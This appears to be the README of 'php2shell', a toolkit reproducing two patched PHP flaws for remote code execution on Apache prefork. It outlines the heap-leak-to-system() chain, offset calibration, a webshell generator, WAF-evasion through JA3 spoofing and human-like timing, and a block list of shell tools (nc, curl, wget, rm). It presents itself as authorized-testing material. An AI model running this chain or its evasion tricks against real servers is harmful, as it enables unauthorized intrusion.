│      → zend_reference_destroy(R0)            │
│        → zend_array_destroy(fake HT)         │
│          → zend_hash_destroy(fake HT)        │
│            → pDestructor(&bucket) = SYSTEM() │
└──────────────────────────────────────────────┘
```

**What leaks first:** a 4096-byte `Set-Cookie` header carried by an
out-of-bounds `php_url_encode()` read reveals the **Zend MM chunk base**;
a second stale read exposes `zval_ptr_dtor`'s address → **libphp base** →
ASLR defeated, all offsets resolved, command executed.

`--no-pre-rotate`, `--retries`, `--huge-mb`, `--zif-offset/--dtor-offset`
expose every tuning knob the chain has.

---

## ❖ Stealth / anti-bot detection

Request yang dikirim ini sengaja dibikin **kelihatan seperti browser asli**, bukan script:

| Lapisan | Apa yang dilakukan |
|---|---|
| **TLS/JA3 fingerprint** | `curl_cffi` me-replay handshake browser asli (JA3 + ALPN + extensions persis) — script Python standar bikin JA3 aneh yang langsung ketahuan WAF, ini tidak |
| **Profil browser lengkap** | `--ja3 chrome` (default), `safari`, `firefox`, `edge`, `android` — TLS + User-Agent + Accept-Language konsisten satu identitas |
| **Header tampilan normal** | `Accept`, `Accept-Encoding`, `Sec-Fetch-*`, `Upgrade-Insecure-Requests` — persis urutan/isian browser, bukan default `requests`/`urllib` |
| **Rotasi identitas** | profil bergilir antar request → trafik dari 1 IP tidak selalu profil sama (seperti pengguna nyata beda device) |
| **Timing manusiawi** | jeda antar request + jitter acak (0,75×–1,35×) — pola kirim robot yang pas-pasan gampang ke-score |
| **Retry sopan** | backoff eksponensial (2→4→8 detik), bukan nge-brut |
| **Audit trail lokal** | semua request tercatat di file JSONL (`--audit`) — kamu bisa audit sendiri apa yang terkirim |

```bash
# contoh: pakai identitas Safari + lewat proxy + jeda 3 detik antar request
php2shell exploit -u <url> --ja3 safari --proxy http://127.0.0.1:8080 --delay 3 --yes
```

**Jujur soal batasnya:** ini lolos deteksi *script-vs-browser* klasik (JA3, header, pola timing). Kalau target pakai bot-management berat (Cloudflare Bot Management, Akamai) yang mengecek HTTP/2 frame-order, cookie history, bahkan render JS — itu perlombaan senjata lain dan tool ini tidak mengklaim menang di sana. Untuk lab PHP prefork & mayoritas server biasa: cukup aman. 😉

---

## ❖ The 5 lab requirements

Your run fails on a build/config that isn't calibrated. These are the knobs:

1. **`MaxRequestWorkers 1`** — producer & consumer must land on the *same* worker
2. **`KeepAlive Off`**
3. **fresh `out/offsets.env`** — stale offsets are the #1 silent killer
4. **`session.upload_progress.cleanup = On`**
5. **minimal endpoint** — `<?php echo "OK\n"; ?>`

Targets with a different build (distro PHP, other version): measure their
`libphp.so` and pass `--zif-offset / --dtor-offset`. Retrying with wrong
offsets never helps — `HEAP_LEAK_FAILED` means *not calibrated*, not *"safe"*.

---

## ❖ FAQ

<details>
<summary><b>Does it work against any PHP site?</b></summary>

No — and this is an honest limitation. It requires mod_php + Apache **prefork**,
the vulnerable version range, `session.upload_progress=On`, and heap conditions
matching a calibrated build. php-fpm largely mitigates this bug. That's what the
`detect` + `preflight` modes are for — run them first.
</details>

<details>
<summary><b>Why is there no reverse shell mode?</b></summary>

Deliberate. This is a **proof-of-access** toolkit: it proves code execution with
identity commands (`id`, `whoami`) and refuses to become an attack appliance —
`sh`, `bash`, `nc`, `curl`, `wget`, `chmod`, `rm` are blocked at runner level
and cannot be enabled by any flag. For benign persistence testing there is the
password-protected `shell` generator (bcrypt, TTL, whitelist, never auto-uploads).
</details>

<details>
<summary><b>Can I add custom commands?</b></summary>

Yes, within the fence: `--allow-cmd ls --allow-cmd df` extends the whitelist to
a fixed, reviewed set (`uname`, `hostname`, `pwd`, `ls`, `cat`, `df`, `uptime`,
`who`, `w`, `env`). Arbitrary binaries and chaining (`;`, `|`, `$(`, backticks)
remain impossible.
</details>

<details>
<summary><b>The exploit fails with HEAP_LEAK_FAILED — is the target patched?</b></summary>

Not necessarily. It usually means the target's build isn't calibrated (different
distro compile, different version). Measure the target's `libphp.so` and pass
the offsets manually. See "The 5 lab requirements".
</details>

<details>
<summary><b>Is using this legal?</b></summary>

Use on systems you **own** or have **written authorization** to test. Scanning
or exploiting third-party systems is a crime in most jurisdictions (UU ITE,
Computer Fraud and Abuse Act, etc.). The tool's design (14-byte identity
commands, no shells, no exfil primitives) reflects that scope.
</details>

---

## ❖ Verification

| Claim | Evidence |
|---|---|
| RCE on official `php:8.4.26-apache` | reproducible `PROOF: uid=33(www-data)`, incl. single-attempt runs |
| Chain engine ≡ reference exploit | byte-level diff — 7 core functions, constants, orchestration identical |
| Patched 8.4.27 refuses the chain | consumer runs stay clean on the patched regression lab |
| Command fence | 16 negative test cases, rejected **before** any network I/O |
| `--revshell` | blocked at runner level (exit 2), not just parser |
| Multi-target mode | dedupe, auto-https, JSON/CSV verified live |
| 81 unit tests | `python -m unittest discover -s tests -t .` → OK |

---

## ❖ Repository layout

```text
php2shell/
├── php2shell.py          single CLI: scan/detect/preflight/exploit/shell
├── install.sh            one-shot installer (venv + deps + smoke tests)
├── requirements.txt      curl_cffi, bcrypt
├── lib/
│   ├── chain.py          ── THE ENGINE: pure-python exploit chain (in-process)
│   ├── transport.py      curl_cffi JA3 transport + rate limit + audit log
│   ├── detect.py         fingerprint: version, SAPI, upload_progress…
│   ├── preflight.py      readiness score; detection ≠ gate
│   ├── build_support.py  tabel RCE / leak-saja / belum-terbukti per build
│   ├── memprobe.py       baca memory_limit target lewat 1 request
│   ├── exploit_runner.py orchestration + command fence + auto-proof
│   ├── reporter.py       JSON / CSV / terminal tables
│   └── banner.py         the skull ASCII
├── shell/                password-protected webshell GENERATOR
├── lab/lab_docker.sh     author-config vulnerable lab, one command
├── docker/               php.ini / apache.conf / www / offsets.py
├── docs/                 SYARAT_TARGET.md — apa yang menentukan rantai jalan
├── tests/                81 unit tests
└── gambar/               screenshot
```

---

## ❖ Disclaimer — authorized use only

<div align="center">

This tool publishes **defense-relevant reproduction** of two **already-patched**
PHP vulnerabilities for research, blue-team validation, and patch-verification.
Use it **only** on systems you own or have written authorization to test.

Exploiting third-party systems without authorization is a crime
(UU ITE Indonesia, US CFAA, EU equivalents).

The design (identity-only commands, no shell primitives, no exfiltration)
is intentional — this toolkit proves impact; it does not weaponize beyond proof.

**See [SECURITY.md](SECURITY.md) · License: [GPL-3.0-only](LICENSE)**

</div>

---

<div align="center">
<sub><b>Penemu CVE:</b> Calif (Ryan A.) — temuan pertama 1 Agu 2026, lapor 11 Agu ·
Wiz Research — temuan independen 19 Agu 2026 ·
OpenAI Codex Security (Amy Burnett) — vektor tambahan, lapor 18 Sep 2026<br>
<b>Kode &amp; riset yang jadi dasar:</b> 9bie (Qi Deng) — exploit publik &amp; heap grooming ·
Karasawa2025 — arah <code>display_errors=Off</code> ·
v.dir.mir — <code>--revshell</code> pada acuan ·
Zer061 — fork acuan <code>exploit.py</code> ·
ikow — verifikator OOM ·
devploit — tabel 13 profil heap<br>
<b>Advisori &amp; perbaikan:</b> PHP Group — GHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp<br>
reproduction, tooling &amp; hardening by <b>aarsaputra</b><br>
<sub>Kredit kurang atau keliru? Buka issue.</sub></sub>
</div>
